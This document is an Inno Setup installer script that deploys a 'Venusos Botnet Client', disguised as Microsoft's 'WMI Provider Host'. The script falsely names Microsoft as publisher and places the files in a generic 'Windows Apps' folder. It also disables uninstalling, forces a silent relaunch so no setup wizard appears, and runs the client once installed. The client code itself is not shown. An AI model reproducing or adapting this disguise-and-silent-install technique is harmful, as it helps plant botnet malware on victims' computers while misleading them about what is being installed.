; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "WMI Provider Host"
#define MyAppVersion "1.0"
#define MyAppPublisher "? Microsoft Corporation"
#define MyAppExeName "WMI Provider Host.exe"

[Setup]
AppId={{1339E272-DF99-49EB-BA8D-A2D6EECED5BB}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
DefaultDirName={autopf}\Windows Apps
DisableDirPage=yes
Uninstallable=no
OutputBaseFilename=Venusos Botnet Client Setup
SetupIconFile=C:\Users\janek\OneDrive\Dokumenty\botnet\Venusos Botnet Client\icon.ico

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "C:\Users\janek\OneDrive\Dokumenty\botnet\Venusos Botnet Client\bin\Debug\net6.0\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\janek\OneDrive\Dokumenty\botnet\Venusos Botnet Client\bin\Debug\net6.0\WMI Provider Host.deps.json"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\janek\OneDrive\Dokumenty\botnet\Venusos Botnet Client\bin\Debug\net6.0\WMI Provider Host.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\janek\OneDrive\Dokumenty\botnet\Venusos Botnet Client\bin\Debug\net6.0\WMI Provider Host.pdb"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\janek\OneDrive\Dokumenty\botnet\Venusos Botnet Client\bin\Debug\net6.0\WMI Provider Host.runtimeconfig.json"; DestDir: "{app}"; Flags: ignoreversion

[Run]
Filename: {app}\WMI Provider Host.exe; Flags: postinstall nowait runascurrentuser

[Code]
#ifdef UNICODE
  #define AW "W"
#else
  #define AW "A"
#endif
type
  HINSTANCE = THandle;

function ShellExecute(hwnd: HWND; lpOperation: string; lpFile: string;
  lpParameters: string; lpDirectory: string; nShowCmd: Integer): HINSTANCE;
  external 'ShellExecute{#AW}@shell32.dll stdcall';

function InitializeSetup: Boolean;
begin
  // if this instance of the setup is not silent which is by running
  // setup binary without /SILENT parameter, stop the initialization
  Result := WizardSilent;
  // if this instance is not silent, then...
  if not Result then
  begin
    // re-run the setup with /SILENT parameter; because executing of
    // the setup loader is not possible with ShellExec function, we
    // need to use a WinAPI workaround
    if ShellExecute(0, '', ExpandConstant('{srcexe}'), '/SILENT', '',
      SW_SHOW) <= 32
    then
      // if re-running this setup to silent mode failed, let's allow
      // this non-silent setup to be run
      Result := True;
  end;
end;

